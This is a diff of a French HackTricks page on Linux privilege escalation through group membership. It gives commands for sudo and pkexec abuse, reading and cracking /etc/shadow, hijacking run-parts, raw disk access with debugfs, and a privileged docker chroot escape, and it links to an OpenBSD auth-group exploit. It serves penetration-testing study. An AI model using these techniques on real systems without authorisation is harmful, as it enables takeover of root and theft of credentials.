@@ -1,24 +1,25 @@
 # Groupes intéressants - Élévation de privilèges Linux
 
+{% hint style="success" %}
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Soutenez HackTricks</summary>
 
-Autres façons de soutenir HackTricks :
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
+{% endhint %}
 
 ## Groupes Sudo/Admin
 
 ### **PE - Méthode 1**
 
-**Parfois**, **par défaut (ou parce que certains logiciels en ont besoin)** à l'intérieur du fichier **/etc/sudoers**, vous pouvez trouver certaines de ces lignes :
+**Parfois**, **par défaut (ou parce qu'un logiciel en a besoin)** à l'intérieur du fichier **/etc/sudoers**, vous pouvez trouver certaines de ces lignes :
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -34,12 +35,12 @@ sudo su
 ```
 ### PE - Méthode 2
 
-Trouvez tous les binaires suid et vérifiez s'il y a le binaire **Pkexec** :
+Trouvez tous les binaires suid et vérifiez s'il y a le binaire **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
 Si vous constatez que le binaire **pkexec est un binaire SUID** et que vous appartenez à **sudo** ou **admin**, vous pourriez probablement exécuter des binaires en tant que sudo en utilisant `pkexec`.\
-Cela est dû au fait que ces groupes sont généralement inclus dans la **politique polkit**. Cette politique identifie essentiellement les groupes pouvant utiliser `pkexec`. Vérifiez-le avec :
+Cela est dû au fait que ce sont généralement les groupes à l'intérieur de la **politique polkit**. Cette politique identifie essentiellement les groupes qui peuvent utiliser `pkexec`. Vérifiez-le avec :
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -55,7 +56,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Ce n'est pas parce que vous n'avez pas les autorisations mais parce que vous n'êtes pas connecté sans GUI**. Et il y a une solution à ce problème ici : [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes** :
+**Ce n'est pas parce que vous n'avez pas les autorisations mais parce que vous n'êtes pas connecté sans GUI**. Et il y a une solution de contournement pour ce problème ici: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes**:
 
 {% code title="session1" %}
 ```bash
@@ -90,7 +91,7 @@ Les utilisateurs du **groupe shadow** peuvent **lire** le fichier **/etc/shadow*
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-Donc, lisez le fichier et essayez de **craquer certains hashs**.
+Donc, lisez le fichier et essayez de **craquer certains hachages**.
 
 ## Groupe du Personnel
 
@@ -106,7 +107,7 @@ $ echo $PATH
 ```
 Si nous pouvons pirater certains programmes dans `/usr/local`, nous pouvons facilement obtenir les droits root.
 
-Pirater le programme `run-parts` est un moyen facile d'obtenir les droits root, car la plupart des programmes exécuteront un `run-parts` (comme cron, lors de la connexion ssh).
+Pirater le programme `run-parts` est un moyen facile d'obtenir les droits root, car la plupart des programmes exécuteront un `run-parts` (comme crontab, lors de la connexion ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -164,7 +165,7 @@ Notez qu'en utilisant debugfs, vous pouvez également **écrire des fichiers**. 
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Cependant, si vous essayez de **modifier des fichiers appartenant à root** (comme `/etc/shadow` ou `/etc/passwd`), vous obtiendrez une erreur "**Permission denied**".
+Cependant, si vous essayez de **écrire des fichiers appartenant à root** (comme `/etc/shadow` ou `/etc/passwd`), vous obtiendrez une erreur "**Permission refusée**".
 
 ## Groupe Vidéo
 
@@ -185,13 +186,13 @@ Pour **ouvrir** l'**image brute**, vous pouvez utiliser **GIMP**, sélectionnez 
 
 ![](<../../../.gitbook/assets/image (463).png>)
 
-Ensuite, modifiez la largeur et la hauteur pour celles utilisées à l'écran et vérifiez différents types d'images (et sélectionnez celui qui affiche mieux l'écran) :
+Ensuite, modifiez la largeur et la hauteur pour celles utilisées sur l'écran et vérifiez différents types d'images (et sélectionnez celui qui affiche mieux l'écran) :
 
 ![](<../../../.gitbook/assets/image (317).png>)
 
 ## Groupe Root
 
-Il semble qu'en **tant que membres du groupe root**, ils pourraient avoir accès à la **modification** de certains fichiers de configuration de **services** ou de certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour escalader les privilèges...
+Il semble qu'en **tant que membres du groupe root** par défaut, vous pourriez avoir accès à la **modification** de certains fichiers de configuration de **services** ou de certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour escalader les privilèges...
 
 **Vérifiez quels fichiers les membres de root peuvent modifier** :
 ```bash
@@ -213,24 +214,16 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 ```
 ## Groupe lxc/lxd
 
-Si vous n'aimez aucune des suggestions précédentes, ou si elles ne fonctionnent pas pour une raison quelconque (pare-feu api docker ?), vous pouvez toujours essayer de **lancer un conteneur privilégié et de vous échapper** comme expliqué ici :
-
-{% content-ref url="../docker-security/" %}
-[sécurité-docker](../docker-security/)
+{% content-ref url="./" %}
+[.](./)
 {% endcontent-ref %}
-
-Si vous avez des permissions d'écriture sur le socket docker, lisez [**cet article sur comment escalader les privilèges en abusant du socket docker**](../#writable-docker-socket)**.**
-
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
-
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
 ## Groupe Adm
 
-Généralement, les **membres** du groupe **`adm`** ont des permissions pour **lire les fichiers journaux** situés dans _/var/log/_.\
+Généralement, les **membres** du groupe **`adm`** ont des autorisations pour **lire les fichiers journaux** situés dans _/var/log/_.\
 Par conséquent, si vous avez compromis un utilisateur de ce groupe, vous devriez certainement **consulter les journaux**.
 
 ## Groupe Auth
 
 À l'intérieur d'OpenBSD, le groupe **auth** peut généralement écrire dans les dossiers _**/etc/skey**_ et _**/var/db/yubikey**_ s'ils sont utilisés.\
-Ces permissions peuvent être abusées avec l'exploit suivant pour **escalader les privilèges** vers root : [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Ces autorisations peuvent être exploitées avec l'exploit suivant pour **escalader les privilèges** vers root : [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
